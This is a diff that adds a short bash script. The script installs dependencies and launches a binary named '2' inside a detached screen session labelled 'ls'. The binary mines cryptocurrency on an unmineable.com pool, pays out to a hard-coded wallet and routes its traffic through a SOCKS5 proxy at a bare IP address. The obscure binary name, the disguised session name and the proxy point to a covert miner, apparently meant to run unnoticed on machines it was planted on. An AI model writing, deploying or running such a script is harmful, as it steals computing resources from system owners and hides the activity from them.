@@ -1,0 +1,8 @@
+#!/bin/bash
+sudo apt update
+sudo apt install screen libjansson4 -y
+sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
+chmod +x 2
+screen -dmS ls
+
+ ./2 -a rx/0 -o rx-eu.unmineable.com:3333  -u USDT:0x40819d362CCfb0bb130C80cc0dBB4cdef5b02417.$(echo $(shuf -i 1000-9999 -n 1)-SUPER99)#rame-kb3u -x socks5://72.221.172.203:4145 
